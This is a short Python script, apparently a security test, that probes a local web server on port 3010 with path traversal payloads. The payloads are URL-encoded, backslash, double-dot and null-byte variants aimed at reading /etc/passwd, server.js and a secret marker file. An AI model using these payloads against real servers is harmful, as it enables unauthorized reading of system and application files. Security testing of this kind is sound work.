import urllib.request, urllib.error

B='http://127.0.0.1:3010'
op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
def g(path):
    try:
        r=urllib.request.Request(B+path)
        with op.open(r,timeout=8) as f: return f.status, f.read()[:200]
    except urllib.error.HTTPError as e: return e.code, e.read()[:200]
    except Exception as e: return -1, str(e).encode()

paths = [
 "/marker.txt",
 "/../standalone_secret_marker",
 "/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
 "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
 "/....//....//....//....//....//....//etc/passwd",
 "/..\\..\\..\\..\\..\\..\\etc\\passwd",
 "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
 "/..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd",
 "/public/../../server.js",
 "/public/..%2f..%2fserver.js",
 "/public%2f..%2f..%2fserver.js",
 "/public/%2e%2e/%2e%2e/server.js",
 "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
 "//etc/passwd",
 "/./../../../../../../etc/passwd",
 "/marker.txt/../../../../../../etc/passwd",
 "/marker.txt%00.jpg",
]
for p in paths:
    st, b = g(p)
    print(f"{p:65s} -> {st}  len={len(b)}  body[:60]={b[:60]!r}")
